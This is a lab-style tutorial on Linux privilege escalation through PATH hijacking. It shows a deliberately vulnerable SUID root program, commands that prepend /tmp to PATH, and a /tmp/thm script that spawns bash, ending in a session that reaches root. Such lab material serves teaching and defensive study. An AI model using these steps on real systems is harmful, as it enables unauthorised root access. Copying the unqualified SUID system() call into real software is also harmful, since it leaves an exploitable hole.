# PATH Variable Privilege Escalation Notes

If a directory that your user has write permission on is included in `$PATH`, you may be able to hijack a privileged application into executing a malicious script or binary of your choosing.

`PATH` is an environment variable that tells the operating system where to search for executables. For any command that isn't built into the shell, or isn't invoked with an absolute path, Linux searches through the directories listed in `$PATH`, in order, until it finds a matching executable.

> **Note:** `PATH` (uppercase) refers to the environment variable itself. `path` (lowercase) refers to a location/directory.

## Table of Contents

- [Checking PATH](#checking-path)
- [Prerequisites for Exploitation](#prerequisites-for-exploitation)
- [Example Vulnerable Program](#example-vulnerable-program)
- [Finding Writable Directories](#finding-writable-directories)
- [Modifying PATH](#modifying-path)
- [Creating the Malicious Binary](#creating-the-malicious-binary)
- [Escalating to Root](#escalating-to-root)
- [Summary](#summary)

---

## Checking PATH

```bash
echo $PATH
```

Example output:

```bash
john@path-box:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

If you type a command (e.g., `thm`) into the shell, these are the directories Linux searches, in order, to locate a matching executable.

---

## Prerequisites for Exploitation

This technique depends entirely on the target system's existing configuration. Before attempting it, confirm:

1. What directories are listed under `$PATH`?
2. Does your current user have write privileges on any of these directories?
3. Can you modify `$PATH`?
4. Is there a script or application (ideally SUID/root-owned) that calls an executable without specifying its absolute path, and that would be affected by this?

---

## Example Vulnerable Program

The following program calls a binary named `thm` without specifying its absolute path, meaning it relies on `$PATH` to locate it. It is compiled and given the SUID bit, so it runs with root privileges regardless of who invokes it.

```c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("thm");
}
```

Compile and set the SUID bit:

```bash
root@path-box:~# gcc path_exp.c -o program -w
root@path-box:~# chmod u+s program
root@path-box:~# ls -l
total 24
-rwsr-xr-x 1 root  root  16792 Jun 17 07:02 program
-rw-rw-r-- 1 alper alper    76 Jun 17 06:53 path_exp.c
```

Once executed, `program` will search every directory listed in `$PATH` for an executable named `thm`. If any writable directory exists in `$PATH`, a binary named `thm` can be placed there — and since `program` runs with SUID root, whatever `thm` does will also run as root.

---

## Finding Writable Directories

```bash
find / -type d -writable 2> /dev/null | sort -u
```

Example output:

```bash
john@path-box:~$ find / -type d -writable 2> /dev/null | sort -u
/run/user/1001/systemd/inaccessible
/run/user/1001/systemd/propagate
/run/user/1001/systemd/propagate/.os-release-stage
/run/user/1001/systemd/units
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope
/tmp
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
```

`/tmp` is usually the easiest writable directory to leverage, but it typically isn't listed in `$PATH` by default — so it needs to be added.

---

## Modifying PATH

Prepend `/tmp` to `$PATH` so it's searched first:

```bash
john@path-box:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
john@path-box:~$ export PATH=/tmp:$PATH
john@path-box:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

The vulnerable `program` binary will now also check `/tmp` when looking for `thm`.

---

## Creating the Malicious Binary

Create a script named `thm` in `/tmp` that spawns a shell, and make it executable:

```bash
john@path-box:~$ cd /tmp
john@path-box:~$ echo "/bin/bash" > thm
john@path-box:~$ chmod 777 thm
john@path-box:~$ ls -l thm
-rwxrwxrwx 1 john john 10 Jun 17 14:36 thm
```

---

## Escalating to Root

Since `program` runs with SUID root and now resolves `thm` from the writable `/tmp` directory, executing it launches your `thm` script (a bash shell) with root privileges:

```bash
john@path-box:~$ whoami
john
john@path-box:~$ ./program
root@path-box:~# whoami
root
```

---

## Summary

PATH hijacking works when a privileged (typically SUID) program calls an executable by name rather than by absolute path, and a directory earlier in `$PATH` (or newly prepended to it) is writable by a low-privilege user. Placing a malicious binary with the expected name in that directory causes the privileged program to execute attacker-controlled code with elevated rights.

## References

- [GTFOBins](https://gtfobins.github.io/) — a curated list of Unix binaries that can be exploited for privilege escalation.
